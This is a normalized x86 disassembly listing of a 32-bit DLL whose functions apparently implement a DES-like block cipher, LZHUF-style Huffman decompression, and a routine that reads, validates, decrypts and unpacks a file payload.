sub_10001000
push ebp
mov ebp [ esp + 0x8 ]
push esi
mov esi ecx
test esi esi
je r-xdata
pop esi
xor al al
pop ebp
retn 0x8
test ebp ebp
je r-xdata
test eax eax
je r-xdata
mov ecx [ esp + 0x10 ]
add ecx 0x7
and ecx 0xfffffff8
mov [ esp + 0x10 ] ecx
je r-xdata
push ebx
push eax
mov ebx edx
mov eax edi
call sub_100010d0
cmp [ edi + 0x600 ] 0x0
jne r-xdata
mov ebx [ esp + 0x14 ]
sar ebx 0x3
test ebx ebx
jle r-xdata
mov eax [ esp + 0x14 ]
sar eax 0x3
test eax eax
jle r-xdata
pop ebx
pop esi
mov al 0x1
pop ebp
retn 0x8
push 0x1
push esi
push edi
mov eax edi
mov ecx ebp
call sub_10001140
push 0x0
push esi
push edi
lea eax [ edi + 0x300 ]
mov ecx esi
call sub_10001140
push 0x1
push esi
push edi
mov eax edi
mov ecx esi
call sub_10001140
add esi 0x8
add ebp 0x8
sub ebx 0x1
jne r-xdata
mov ebx eax
push 0x1
push esi
push edi
mov eax edi
mov ecx ebp
call sub_10001140
add esi 0x8
add ebp 0x8
sub ebx 0x1
jne r-xdata
pop ebx
pop esi
mov al 0x1
pop ebp
retn 0x8
sub_100010d0
push esi
push edi
mov edi eax
xor eax eax
cmp ebx 0x10
lea esi [ edi + 0x701 ]
mov [ esi ] eax
mov [ esi + 0x4 ] eax
mov [ esi + 0x8 ] eax
mov [ esi + 0xc ] eax
mov eax 0x10
jg r-xdata
push eax
mov eax [ esp + 0x10 ]
push eax
push esi
call sub_100109a0
add esp 0xc
push edi
mov eax esi
call sub_100013a0
cmp ebx 0x8
jle r-xdata
mov eax ebx
xor al al
mov [ edi + 0x600 ] al
pop edi
pop esi
retn 0x4
lea ecx [ edi + 0x300 ]
lea eax [ edi + 0x709 ]
push ecx
call sub_100013a0
mov al 0x1
mov [ edi + 0x600 ] al
pop edi
pop esi
retn 0x4
sub_10001140
push ebp
mov ebp [ esp + 0x8 ]
push esi
push edi
mov edi eax
mov esi ecx
xor eax eax
lea ecx [ ecx ]
mov edx eax
sar edx 0x3
mov dl [ edx + esi ]
mov cl al
and cl 0x7
sar dl cl
inc eax
and dl 0x1
cmp eax 0x40
mov [ eax + rw-data ] dl
jl r-xdata
xor eax eax
movsx ecx [ eax + r--data ]
movzx edx [ ecx + rw-data ]
mov [ eax + ebp + 0x601 ] dl
movsx ecx [ eax + r--data ]
movzx edx [ ecx + rw-data ]
mov [ eax + ebp + 0x602 ] dl
movsx ecx [ eax + r--data ]
movzx edx [ ecx + rw-data ]
mov [ eax + ebp + 0x603 ] dl
movsx ecx [ eax + r--data ]
movzx edx [ ecx + rw-data ]
mov [ eax + ebp + 0x604 ] dl
add eax 0x4
cmp eax 0x40
jl r-xdata
push ebx
lea eax [ ebp + 0x601 ]
push 0x40
push eax
push rw-data
mov [ esp + 0x20 ] eax
call sub_100109a0
add esp 0xc
cmp [ esp + 0x1c ] 0x0
jne r-xdata
mov [ esp + 0x1c ] 0xf
lea ebx [ edi + 0x2d0 ]
lea ebx [ ebx ]
mov ebx edi
mov [ esp + 0x1c ] 0x10
lea esp [ esp ]
movzx ecx [ eax + rw-data ]
movzx edx [ eax + rw-data ]
xor [ eax + rw-data ] cl
xor [ eax + rw-data ] dl
movzx ecx [ eax + rw-data ]
movzx edx [ eax + rw-data ]
xor [ eax + rw-data ] cl
xor [ eax + rw-data ] dl
add eax 0x4
cmp eax 0x20
jl r-xdata
mov eax [ esp + 0x1c ]
dec eax
mov ecx 0x8
mov esi rw-data
mov edi rw-data
sub ebx 0x30
[ edi ] [ esi ]
mov [ esp + 0x1c ] eax
test eax eax
jge r-xdata
movzx ecx [ eax + rw-data ]
movzx edx [ eax + rw-data ]
xor [ eax + rw-data ] cl
xor [ eax + rw-data ] dl
movzx ecx [ eax + rw-data ]
movzx edx [ eax + rw-data ]
xor [ eax + rw-data ] cl
xor [ eax + rw-data ] dl
add eax 0x4
cmp eax 0x20
jl r-xdata
mov ecx 0x8
mov esi rw-data
mov edi rw-data
add ebx 0x30
sub [ esp + 0x1c ] 0x1
[ edi ] [ esi ]
jne r-xdata
mov ecx 0x8
mov esi rw-data
mov edi rw-data
[ edi ] [ esi ]
mov edi rw-data
mov esi ebp
call sub_10001590
xor eax eax
nop
xor eax eax
pop ebx
mov ecx 0x8
mov esi rw-data
mov edi rw-data
[ edi ] [ esi ]
mov edi rw-data
mov esi ebp
call sub_10001590
xor eax eax
nop
jmp r-xdata
movsx ecx [ eax + r--data ]
movzx edx [ ecx + rw-data ]
mov [ eax + ebp + 0x601 ] dl
movsx ecx [ eax + r--data ]
movzx edx [ ecx + rw-data ]
mov [ eax + ebp + 0x602 ] dl
movsx ecx [ eax + r--data ]
movzx edx [ ecx + rw-data ]
mov [ eax + ebp + 0x603 ] dl
movsx ecx [ eax + r--data ]
movzx edx [ ecx + rw-data ]
mov [ eax + ebp + 0x604 ] dl
add eax 0x4
cmp eax 0x40
jl r-xdata
mov eax [ esp + 0x10 ]
push 0x40
push eax
push rw-data
call sub_100109a0
mov esi [ esp + 0x20 ]
add esp 0xc
mov edx rw-data
call sub_10001780
pop edi
pop esi
pop ebp
retn 0xc
sub_100013a0
push ebx
push ebp
push esi
mov esi eax
xor eax eax
mov edx eax
sar edx 0x3
mov dl [ edx + esi ]
mov cl al
and cl 0x7
sar dl cl
inc eax
and dl 0x1
cmp eax 0x40
mov [ eax + rw-data ] dl
jl r-xdata
xor eax eax
jmp r-xdata
movsx ecx [ eax + r--data ]
movzx edx [ ecx + rw-data ]
mov [ edi + eax + 0x601 ] dl
movsx ecx [ eax + r--data ]
movzx edx [ ecx + rw-data ]
mov [ edi + eax + 0x602 ] dl
movsx ecx [ eax + r--data ]
movzx edx [ ecx + rw-data ]
mov [ edi + eax + 0x603 ] dl
movsx ecx [ eax + r--data ]
movzx edx [ ecx + rw-data ]
mov [ edi + eax + 0x604 ] dl
add eax 0x4
cmp eax 0x38
jl r-xdata
push 0x38
lea ebx [ edi + 0x601 ]
push ebx
push rw-data
call sub_100109a0
mov eax [ esp + 0x1c ]
add esp 0xc
xor ebp ebp
mov [ esp + 0x10 ] eax
lea esp [ esp ]
movsx ecx [ eax + r--data ]
movzx edx [ ecx + rw-data ]
mov [ edi + eax + 0x601 ] dl
movsx ecx [ eax + r--data ]
movzx edx [ ecx + rw-data ]
mov [ edi + eax + 0x602 ] dl
movsx ecx [ eax + r--data ]
movzx edx [ ecx + rw-data ]
mov [ edi + eax + 0x603 ] dl
movsx ecx [ eax + r--data ]
movzx edx [ ecx + rw-data ]
mov [ edi + eax + 0x604 ] dl
movsx ecx [ eax + r--data ]
movzx edx [ ecx + rw-data ]
mov [ edi + eax + 0x605 ] dl
movsx ecx [ eax + r--data ]
movzx edx [ ecx + rw-data ]
mov [ edi + eax + 0x606 ] dl
add eax 0x6
cmp eax 0x30
jl r-xdata
mov esi [ esp + 0x10 ]
push 0x30
push ebx
push esi
call sub_100109a0
inc ebp
add esi 0x30
add esp 0xc
cmp ebp 0x10
mov [ esp + 0x10 ] esi
jl r-xdata
movsx esi [ ebp + r--data ]
push esi
push rw-data
push ebx
call sub_100109a0
mov ecx 0x1c
sub ecx esi
push ecx
lea edx [ esi + rw-data ]
push edx
push rw-data
call sub_100109a0
push esi
mov eax rw-data
sub eax esi
push ebx
push eax
call sub_100109a0
movsx esi [ ebp + r--data ]
push esi
push rw-data
push ebx
call sub_100109a0
mov ecx 0x1c
sub ecx esi
push ecx
lea edx [ esi + rw-data ]
push edx
push rw-data
call sub_100109a0
push esi
mov eax rw-data
sub eax esi
push ebx
push eax
call sub_100109a0
add esp 0x48
xor eax eax
jmp r-xdata
pop esi
pop ebp
pop ebx
retn 0x4
sub_10001590
push ecx
xor eax eax
movsx ecx [ eax + r--data ]
movzx edx [ ecx + edi - 0x1 ]
mov [ esi + eax + 0x601 ] dl
movsx ecx [ eax + r--data ]
movzx edx [ ecx + edi - 0x1 ]
mov [ esi + eax + 0x602 ] dl
movsx ecx [ eax + r--data ]
movzx edx [ ecx + edi - 0x1 ]
mov [ esi + eax + 0x603 ] dl
movsx ecx [ eax + r--data ]
movzx edx [ ecx + edi - 0x1 ]
mov [ esi + eax + 0x604 ] dl
movsx ecx [ eax + r--data ]
movzx edx [ ecx + edi - 0x1 ]
mov [ esi + eax + 0x605 ] dl
movsx ecx [ eax + r--data ]
movzx edx [ ecx + edi - 0x1 ]
mov [ esi + eax + 0x606 ] dl
add eax 0x6
cmp eax 0x30
jl r-xdata
push ebp
lea eax [ esi + 0x601 ]
push 0x30
push eax
push rw-data
mov [ esp + 0x10 ] eax
call sub_100109a0
mov ebp ebx
add esp 0xc
xor eax eax
sub ebp rw-data
movzx ecx [ eax + ebp + rw-data ]
xor [ eax + rw-data ] cl
movzx edx [ ebx + eax + 0x1 ]
xor [ eax + rw-data ] dl
movzx ecx [ ebx + eax + 0x2 ]
xor [ eax + rw-data ] cl
movzx edx [ ebx + eax + 0x3 ]
xor [ eax + rw-data ] dl
movzx ecx [ ebx + eax + 0x4 ]
xor [ eax + rw-data ] cl
movzx edx [ ebx + eax + 0x5 ]
xor [ eax + rw-data ] dl
add eax 0x6
cmp eax 0x30
jl r-xdata
mov eax edi
call sub_10001700
xor eax eax
pop ebp
lea esp [ esp ]
movsx ecx [ eax + r--data ]
movzx edx [ ecx + edi - 0x1 ]
mov [ esi + eax + 0x601 ] dl
movsx ecx [ eax + r--data ]
movzx edx [ ecx + edi - 0x1 ]
mov [ esi + eax + 0x602 ] dl
movsx ecx [ eax + r--data ]
movzx edx [ ecx + edi - 0x1 ]
mov [ esi + eax + 0x603 ] dl
movsx ecx [ eax + r--data ]
movzx edx [ ecx + edi - 0x1 ]
mov [ esi + eax + 0x604 ] dl
add eax 0x4
cmp eax 0x20
jl r-xdata
mov eax [ esp ]
push 0x20
push eax
push edi
call sub_100109a0
add esp 0x10
retn
sub_10001700
push ebp
push esi
push edi
xor edi edi
mov esi eax
mov ecx rw-data
lea ebp [ edi + 0x8 ]
nop
mov al [ ecx ]
mov dl [ ecx - 0x1 ]
add al al
add al [ ecx + 0x1 ]
add dl dl
add dl [ ecx + 0x4 ]
add al al
add al [ ecx + 0x2 ]
movsx edx dl
add al al
add al [ ecx + 0x3 ]
add edx edi
shl edx 0x4
movsx eax al
lea eax [ edx + eax + r--data ]
movzx edx [ eax ]
and dl 0x1
mov [ esi ] dl
movzx edx [ eax ]
sar dl 0x1
and dl 0x1
mov [ esi + 0x1 ] dl
movzx edx [ eax ]
sar dl 0x2
and dl 0x1
mov [ esi + 0x2 ] dl
movzx eax [ eax ]
sar al 0x3
and al 0x1
mov [ esi + 0x3 ] al
add edi 0x4
add ecx 0x6
add esi 0x4
sub ebp 0x1
jne r-xdata
pop edi
pop esi
pop ebp
retn
sub_10001780
push ebx
xor eax eax
push ebp
mov [ esi ] eax
push edi
mov [ esi + 0x4 ] eax
lea edi [ edx + 0x3 ]
mov eax 0x1
lea ecx [ eax - 0x1 ]
mov ebx ecx
sar ebx 0x3
lea ebp [ ebx + esi ]
movzx ebx [ eax + edx - 0x1 ]
and ecx 0x7
shl bl cl
mov ecx eax
sar ecx 0x3
add edi 0x4
or [ ebp ] bl
movzx ebx [ eax + edx ]
lea ebp [ ecx + esi ]
mov ecx eax
and ecx 0x7
shl bl cl
lea ecx [ eax + 0x1 ]
or [ ebp ] bl
mov ebx ecx
sar ebx 0x3
lea ebp [ ebx + esi ]
movzx ebx [ edi - 0x5 ]
and ecx 0x7
shl bl cl
lea ecx [ eax + 0x2 ]
add eax 0x4
or [ ebp ] bl
mov ebx ecx
sar ebx 0x3
lea ebp [ ebx + esi ]
movzx ebx [ edi - 0x4 ]
and ecx 0x7
shl bl cl
lea ecx [ eax - 0x1 ]
or [ ebp ] bl
cmp ecx 0x40
jl r-xdata
pop edi
pop ebp
pop ebx
retn
sub_10001800
sub esp 0x768
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x764 ] eax
mov eax [ esp + 0x76c ]
push ebp
mov ebp [ esp + 0x774 ]
push esi
push r--data
push eax
call sub_1000c1e0
mov esi eax
add esp 0x8
test esi esi
je r-xdata
mov ecx [ esp + 0x76c ]
pop esi
pop ebp
xor ecx esp
call sub_1000c0a5
add esp 0x768
retn 0x8
push edi
push esi
call sub_1000c4bf
push 0x2
push 0x0
push esi
call sub_1000c96a
push esi
call sub_1000c872
push 0x0
push 0x0
push esi
mov edi eax
call sub_1000c96a
add esp 0x20
push esi
call sub_1000c0b4
add esp 0x4
test eax eax
je r-xdata
mov dl [ esp + 0x729 ]
cmp dl [ rw-data ]
jne r-xdata
push esi
push 0x8
lea eax [ esp + 0x730 ]
push 0x1
push eax
call sub_1000c497
mov cl [ esp + 0x738 ]
add esp 0x10
cmp cl [ rw-data ]
jne r-xdata
push esi
call sub_1000ca66
add esp 0x4
xor eax eax
mov al [ esp + 0x72a ]
cmp al [ rw-data ]
jne r-xdata
mov cl [ esp + 0x72b ]
cmp cl [ rw-data ]
jne r-xdata
mov dl [ esp + 0x72c ]
cmp dl [ rw-data ]
jne r-xdata
mov al [ esp + 0x72d ]
cmp al [ rw-data ]
jne r-xdata
mov cl [ esp + 0x72e ]
cmp cl [ rw-data ]
jne r-xdata
mov dl [ esp + 0x72f ]
cmp dl [ rw-data ]
je r-xdata
push esi
push 0x1
lea eax [ esp + 0x18 ]
push 0x4
push eax
call sub_1000c497
push esi
call sub_1000c872
mov ecx [ esp + 0x24 ]
add esp 0x14
cmp ecx 0x40
jae r-xdata
add eax ecx
cmp eax edi
jae r-xdata
push esi
push 0x1
push ecx
lea ecx [ esp + 0x73c ]
push ecx
call sub_1000c497
push esi
push 0x1
lea edx [ esp + 0x24 ]
push 0x4
push edx
call sub_1000c497
push esi
call sub_1000c872
mov ecx [ esp + 0x30 ]
add eax ecx
add esp 0x24
cmp eax edi
jae r-xdata
cmp ecx 0x1000
ja r-xdata
push ebx
push ecx
call sub_1000cafd
mov ecx [ esp + 0x14 ]
push esi
push 0x1
mov ebx eax
push ecx
push ebx
call sub_1000c497
mov edx [ esp + 0x24 ]
add esp 0x14
push edx
mov edx [ esp + 0x18 ]
push ebx
lea eax [ esp + 0x73c ]
mov ecx ebp
lea edi [ esp + 0x20 ]
call sub_10001000
push ebx
call sub_1000c4b4
push esi
call sub_1000ca66
add esp 0x8
mov eax 0x1
pop ebx
jmp r-xdata
pop edi
sub_100019e0
sub esp 0x8
cmp [ esi + 0x8378 ] 0x8
ja r-xdata
movzx eax [ esi + 0x8376 ]
dec [ esi + 0x8378 ]
movzx ecx ax
lea edx [ eax + eax ]
movzx eax cx
mov [ esi + 0x8376 ] dx
shr eax 0xf
add esp 0x8
retn
push ebx
push ebp
push edi
xor ebx ebx
jmp r-xdata
mov eax [ esi + 0x83a8 ]
mov [ esp + 0xc ] ebx
cmp eax ebx
jne r-xdata
cmp eax 0x1
jne r-xdata
mov edx [ esi + 0x8384 ]
push ebx
lea eax [ esp + 0x14 ]
push eax
push 0x1
lea ecx [ esp + 0x18 ]
push ecx
push edx
mov [ esp + 0x24 ] ebx
call [ ReadFile@IAT ]
mov ebp [ esp + 0x10 ]
jmp r-xdata
or eax 0xffffffff
jmp r-xdata
mov edi [ esi + 0x83a0 ]
mov ebp eax
mov eax [ esi + 0x8394 ]
lea ecx [ edi + 0x1 ]
cmp ecx eax
jle r-xdata
cmp ebp 0x1
je r-xdata
mov ecx 0xffff
movzx edx ax
cmp ax cx
jne r-xdata
mov edx [ esi + 0x838c ]
push ebp
add edx edi
push edx
lea eax [ esp + 0x14 ]
push eax
call sub_100109a0
add esp 0xc
add edi ebp
mov [ esi + 0x83a0 ] edi
sub eax edi
mov ebp eax
mov eax [ esp + 0xc ]
mov al [ esi + 0x8378 ]
movzx edi al
mov ecx 0x8
sub ecx edi
shl edx cl
add al 0x8
mov [ esi + 0x8378 ] al
or [ esi + 0x8376 ] dx
cmp al 0x8
jbe r-xdata
xor edx edx
pop edi
pop ebp
pop ebx
sub_10001ae0
sub esp 0x8
cmp [ esi + 0x8378 ] 0x8
ja r-xdata
movzx eax [ esi + 0x8376 ]
add [ esi + 0x8378 ] 0xf8
movzx ecx ax
shl eax 0x8
mov [ esi + 0x8376 ] ax
movzx eax cx
shr eax 0x8
add esp 0x8
retn
push ebx
push ebp
push edi
xor ebx ebx
jmp r-xdata
mov eax [ esi + 0x83a8 ]
mov [ esp + 0xc ] ebx
cmp eax ebx
jne r-xdata
cmp eax 0x1
jne r-xdata
mov edx [ esi + 0x8384 ]
push ebx
lea eax [ esp + 0x14 ]
push eax
push 0x1
lea ecx [ esp + 0x18 ]
push ecx
push edx
mov [ esp + 0x24 ] ebx
call [ ReadFile@IAT ]
mov ebp [ esp + 0x10 ]
jmp r-xdata
or eax 0xffffffff
jmp r-xdata
mov edi [ esi + 0x83a0 ]
mov ebp eax
mov eax [ esi + 0x8394 ]
lea ecx [ edi + 0x1 ]
cmp ecx eax
jle r-xdata
cmp ebp 0x1
je r-xdata
mov ecx 0xffff
movzx edx ax
cmp ax cx
jne r-xdata
mov edx [ esi + 0x838c ]
push ebp
add edx edi
push edx
lea eax [ esp + 0x14 ]
push eax
call sub_100109a0
add esp 0xc
add edi ebp
mov [ esi + 0x83a0 ] edi
sub eax edi
mov ebp eax
mov eax [ esp + 0xc ]
mov al [ esi + 0x8378 ]
movzx edi al
mov ecx 0x8
sub ecx edi
shl edx cl
add al 0x8
mov [ esi + 0x8378 ] al
or [ esi + 0x8376 ] dx
cmp al 0x8
jbe r-xdata
xor edx edx
pop edi
pop ebp
pop ebx
sub_10001be0
push ebx
push esi
xor eax eax
lea ecx [ edx + 0x7e90 ]
push edi
jmp r-xdata
mov esi 0x1
mov [ ecx - 0xc42 ] si
lea esi [ eax + 0x273 ]
mov [ ecx ] si
mov [ ecx - 0x274 ] ax
inc eax
mov esi 0x13a
add ecx 0x2
cmp ax si
jl r-xdata
xor esi esi
mov ecx 0x13a
lea edi [ edx + 0x8104 ]
jmp r-xdata
movsx eax si
mov bx [ edx + eax * 2 + 0x7250 ]
add bx [ edx + eax * 2 + 0x724e ]
mov [ edi ] si
mov [ edi - 0xc42 ] bx
mov [ edx + eax * 2 + 0x7738 ] cx
mov [ edx + eax * 2 + 0x7736 ] cx
inc ecx
mov eax 0x272
add esi 0x2
add edi 0x2
cmp cx ax
jle r-xdata
pop edi
mov ecx 0xffff
xor eax eax
pop esi
mov [ edx + 0x7734 ] cx
mov [ edx + 0x7c1a ] ax
pop ebx
retn
sub_10001c90
sub esp 0x8
push ebx
push ebp
push edi
xor ebx ebx
lea ecx [ esi + 0x7e90 ]
mov ebp 0x273
add ecx 0x2
sub ebp 0x1
jne r-xdata
movzx eax [ ecx - 0xc42 ]
inc eax
cdq
movsx edi bx
sub eax edx
sar eax 0x1
mov [ esi + edi * 2 + 0x724e ] ax
mov dx [ ecx ]
mov [ esi + edi * 2 + 0x7e90 ] dx
inc ebx
mov eax 0x273
cmp [ ecx ] ax
jl r-xdata
xor eax eax
mov [ esp + 0xc ] eax
mov ebx 0x13a
jmp r-xdata
lea ecx [ eax + 0x1 ]
movsx edx cx
movsx ecx ax
mov ax [ esi + edx * 2 + 0x724e ]
add ax [ esi + ecx * 2 + 0x724e ]
movsx edx bx
mov [ esi + edx * 2 + 0x724e ] ax
movzx edx ax
lea ecx [ ebx - 0x1 ]
movzx eax cx
movsx ecx cx
mov [ esp + 0x10 ] edx
cmp dx [ esi + ecx * 2 + 0x724e ]
jae r-xdata
inc eax
mov edx ebx
sub edx eax
add edx edx
movzx ecx dx
movsx edi ax
movzx ebp cx
lea eax [ esi + edi * 2 + 0x724e ]
push ebp
push eax
lea eax [ esi + edi * 2 + 0x7250 ]
push eax
call sub_1000cb70
mov cx [ esp + 0x1c ]
lea eax [ esi + edi * 2 + 0x7e90 ]
push ebp
push eax
lea edx [ esi + edi * 2 + 0x7e92 ]
push edx
mov [ esi + edi * 2 + 0x724e ] cx
mov [ esp + 0x28 ] eax
call sub_1000cb70
mov eax [ esp + 0x24 ]
mov ecx [ esp + 0x28 ]
mov [ ecx ] ax
add eax 0x2
inc ebx
mov edx 0x273
add esp 0x18
cmp bx dx
mov [ esp + 0xc ] eax
jl r-xdata
jmp r-xdata
mov eax [ esp + 0xc ]
xor eax eax
lea edx [ esi + 0x7e90 ]
jmp r-xdata
dec eax
movsx ecx ax
cmp dx [ esi + ecx * 2 + 0x724e ]
jb r-xdata
movzx ecx [ edx ]
mov edi 0x273
cmp cx di
movsx ecx cx
mov [ esi + ecx * 2 + 0x7736 ] ax
jge r-xdata
inc eax
mov ecx edi
add edx 0x2
cmp ax cx
jl r-xdata
mov [ esi + ecx * 2 + 0x7738 ] ax
pop edi
pop ebp
pop ebx
add esp 0x8
retn
sub_10001e00
push ebx
push ebp
push esi
mov esi eax
mov eax 0x8000
push edi
cmp [ esi + 0x7732 ] ax
jne r-xdata
movsx ecx [ esp + 0x14 ]
movzx ebx [ esi + ecx * 2 + 0x7c1c ]
jmp r-xdata
call sub_10001c90
movsx ecx bx
inc [ esi + ecx * 2 + 0x724e ]
movzx eax [ esi + ecx * 2 + 0x724e ]
lea edx [ ebx + 0x1 ]
movzx edi ax
movzx eax dx
movsx edx ax
cmp di [ esi + edx * 2 + 0x724e ]
jbe r-xdata
movsx eax bx
movzx ebx [ esi + eax * 2 + 0x7736 ]
test bx bx
jne r-xdata
lea ecx [ ecx ]
pop edi
pop esi
pop ebp
pop ebx
retn 0x4
inc eax
movsx edx ax
cmp di [ esi + edx * 2 + 0x724e ]
ja r-xdata
dec eax
movsx edx ax
mov bp [ esi + edx * 2 + 0x724e ]
mov [ esi + ecx * 2 + 0x724e ] bp
mov [ esi + edx * 2 + 0x724e ] di
movzx edi [ esi + ecx * 2 + 0x7e90 ]
movsx ebp di
mov [ esi + ebp * 2 + 0x7736 ] ax
mov ebp 0x273
cmp di bp
jge r-xdata
movzx ebp [ esi + edx * 2 + 0x7e90 ]
mov [ esi + edx * 2 + 0x7e90 ] di
movsx edx bp
mov edi 0x273
cmp bp di
mov [ esi + edx * 2 + 0x7736 ] bx
jge r-xdata
movsx ebp di
mov [ esi + ebp * 2 + 0x7738 ] ax
mov [ esi + ecx * 2 + 0x7e90 ] bp
movzx ebx ax
mov [ esi + edx * 2 + 0x7738 ] bx
sub_10001f10
push ecx
push esi
mov esi eax
movzx eax [ esi + 0x8374 ]
push edi
mov ecx 0x273
mov di ax
mov [ esp + 0x8 ] eax
cmp di cx
jae r-xdata
add eax 0xfd8d
mov [ esp + 0x8 ] eax
push eax
mov eax esi
call sub_10001e00
mov ax [ esp + 0x8 ]
pop edi
pop esi
pop ecx
retn
lea ecx [ ecx ]
call sub_100019e0
add di ax
movzx edx di
movzx eax [ esi + edx * 2 + 0x7e90 ]
mov ecx 0x273
mov di ax
mov [ esp + 0x8 ] eax
cmp di cx
jb r-xdata
sub_10001f70
sub esp 0x18
push esi
push edi
mov esi eax
xor edi edi
lea edx [ esp + 0x8 ]
mov [ esi + 0x4 ] edi
mov [ esp + 0x8 ] edi
call sub_100022a0
cmp eax 0x1
je r-xdata
mov eax [ esp + 0x8 ]
or eax 0xffffffff
jmp r-xdata
mov eax [ esp + 0x8 ]
or eax 0xffffffff
jmp r-xdata
lea edx [ esp + 0x8 ]
mov [ esi ] eax
mov [ esp + 0x8 ] edi
call sub_100022a0
cmp eax 0x1
je r-xdata
mov eax [ esp + 0x8 ]
or eax 0xffffffff
jmp r-xdata
shl eax 0x8
or [ esi ] eax
lea edx [ esp + 0x8 ]
mov [ esp + 0x8 ] edi
call sub_100022a0
cmp eax 0x1
je r-xdata
mov eax [ esp + 0x8 ]
or eax 0xffffffff
jmp r-xdata
shl eax 0x10
or [ esi ] eax
lea edx [ esp + 0x8 ]
mov [ esp + 0x8 ] edi
call sub_100022a0
cmp eax 0x1
je r-xdata
pop edi
pop esi
add esp 0x18
retn
push ebp
mov edx esi
call sub_10001be0
push 0xfc4
lea eax [ esi + 0x8 ]
push 0x20
push eax
call sub_1000fe10
add esp 0xc
mov ebp 0xfc4
mov [ esp + 0xc ] edi
cmp [ esi ] edi
jbe r-xdata
shl eax 0x18
or [ esi ] eax
je r-xdata
pop ebp
push ebx
lea esp [ esp ]
call sub_10001ae0
movzx edi ax
movzx eax di
movzx cx [ eax + rw-data ]
movzx ax [ eax + rw-data ]
sub ax 0x2
shl cx 0x6
movzx ebx ax
movzx edx cx
mov [ esp + 0x18 ] edx
test bx bx
je r-xdata
mov eax [ esi + 0x83a8 ]
movsx ecx bx
mov [ esp + 0x18 ] ecx
cmp eax edi
jne r-xdata
mov edx [ esp + 0x20 ]
and edi 0x3f
or edi [ esp + 0x18 ]
add edx 0xffffff03
mov eax ebp
sub eax edi
movzx ecx dx
dec eax
xor edx edx
and eax 0xfff
xor edi edi
cmp dx cx
mov [ esp + 0x24 ] ecx
jge r-xdata
add ebx 0xffff
call sub_100019e0
lea ecx [ edi + edi ]
add ax cx
movzx edi ax
test bx bx
jne r-xdata
cmp eax 0x1
jne r-xdata
mov ecx [ esi + 0x8388 ]
push edi
lea edx [ esp + 0x18 ]
push edx
push 0x1
lea eax [ esp + 0x24 ]
push eax
push ecx
mov [ esp + 0x28 ] edi
call [ WriteFile@IAT ]
mov eax [ esp + 0x14 ]
jmp r-xdata
xor edi edi
cwde
mov [ esp + 0x20 ] eax
nop
pop ebx
lea edx [ esp + 0x18 ]
push edx
call sub_100021c0
cmp eax 0x1
jne r-xdata
mov eax esi
call sub_10001f10
movzx ebx ax
mov eax 0x100
cmp bx ax
mov [ esp + 0x20 ] ebx
jge r-xdata
cmp eax 0x1
jne r-xdata
mov ecx [ esi + 0x8388 ]
push eax
lea edx [ esp + 0x20 ]
push edx
mov [ esp + 0x24 ] eax
push 0x1
lea eax [ esp + 0x24 ]
push eax
push ecx
call [ WriteFile@IAT ]
mov eax [ esp + 0x1c ]
jmp r-xdata
movsx eax bp
inc ebp
and ebp 0xfff
inc [ esp + 0x10 ]
mov [ eax + esi + 0x8 ] bl
jmp r-xdata
lea edx [ esp + 0x18 ]
push edx
call sub_100021c0
cmp eax 0x1
jne r-xdata
mov ecx [ esp + 0x10 ]
cmp ecx [ esi ]
jb r-xdata
inc [ esp + 0x10 ]
movsx eax bp
inc ebp
inc edi
and ebp 0xfff
cmp di [ esp + 0x24 ]
mov [ eax + esi + 0x8 ] bl
jl r-xdata
mov ecx [ esp + 0x20 ]
lea edx [ edi + ecx ]
and edx 0xfff
movzx ax [ edx + esi + 0x8 ]
movzx ebx ax
mov eax [ esi + 0x83a8 ]
movsx ecx bx
mov [ esp + 0x18 ] ecx
test eax eax
jne r-xdata
sub_100021c0
mov eax [ esi + 0x8390 ]
cmp [ eax ] 0x0
jne r-xdata
mov eax [ esi + 0x83a4 ]
inc eax
cmp eax [ esi + 0x8398 ]
push ebx
push edi
jle r-xdata
push 0x401
mov [ esi + 0x8398 ] 0x401
call sub_1000cfb2
mov ecx [ esi + 0x8390 ]
mov [ ecx ] eax
mov edx [ esi + 0x8390 ]
add esp 0x4
cmp [ edx ] 0x0
jne r-xdata
mov eax [ esi + 0x8390 ]
mov ecx [ eax ]
add ecx [ esi + 0x83a4 ]
mov edx [ esp + 0xc ]
mov al [ edx ]
mov [ ecx ] al
inc [ esi + 0x83a4 ]
mov eax [ esi + 0x83a4 ]
mov ecx [ esi + 0x839c ]
pop edi
mov [ ecx ] eax
mov eax 0x1
pop ebx
retn 0x4
lea eax [ eax + eax * 2 ]
cdq
sub eax edx
mov edi eax
sar edi 0x1
add edi 0x400
push edi
call sub_1000cfb2
mov ebx eax
add esp 0x4
test ebx ebx
jne r-xdata
or eax 0xffffffff
retn 0x4
mov eax [ esi + 0x83a4 ]
mov ecx [ esi + 0x8390 ]
mov edx [ ecx ]
push eax
push edx
push ebx
call sub_100109a0
mov eax [ esi + 0x8390 ]
mov ecx [ eax ]
push ecx
call sub_1000ced5
mov edx [ esi + 0x8390 ]
mov [ edx ] ebx
add esp 0x10
mov [ esi + 0x8398 ] edi
pop edi
or eax 0xffffffff
pop ebx
retn 0x4
sub_100022a0
push ecx
mov eax [ esi + 0x83a8 ]
test eax eax
jne r-xdata
cmp eax 0x1
jne r-xdata
mov ecx [ esi + 0x8384 ]
push eax
mov [ esp + 0x4 ] eax
lea eax [ esp + 0x4 ]
push eax
push 0x1
push edx
push ecx
call [ ReadFile@IAT ]
mov eax [ esp ]
pop ecx
retn
xor eax eax
pop ecx
retn
mov ecx [ esi + 0x83a0 ]
push ebx
push edi
mov edi eax
mov eax [ esi + 0x8394 ]
lea ebx [ ecx + 0x1 ]
cmp ebx eax
jle r-xdata
mov eax [ esi + 0x838c ]
push edi
add eax ecx
push eax
push edx
call sub_100109a0
add esp 0xc
add [ esi + 0x83a0 ] edi
mov eax edi
pop edi
pop ebx
pop ecx
retn
sub eax ecx
mov edi eax
sub_10002310
mov [ eax + 0x838c ] edx
mov edx [ esp + 0x4 ]
mov [ eax + 0x8394 ] edx
mov edx [ esp + 0x8 ]
mov [ eax + 0x839c ] edx
xor edx edx
mov [ eax + 0x8390 ] ecx
mov [ eax + 0x83a0 ] edx
mov [ eax + 0x83a4 ] edx
mov [ ecx ] edx
mov ecx [ eax + 0x839c ]
mov [ ecx ] edx
xor ecx ecx
mov [ eax + 0x8376 ] cx
mov [ eax + 0x8378 ] dl
mov [ eax + 0x837a ] cx
mov [ eax + 0x837c ] dl
mov [ eax + 0x83a8 ] 0x1
call sub_10001f70
xor eax eax
retn 0x8
sub_100023d0
push esi
mov esi eax
push edi
cmp esi 0x4
jb r-xdata
test esi esi
je r-xdata
lea esp [ esp ]
pop edi
xor eax eax
pop esi
retn
movzx eax [ edx ]
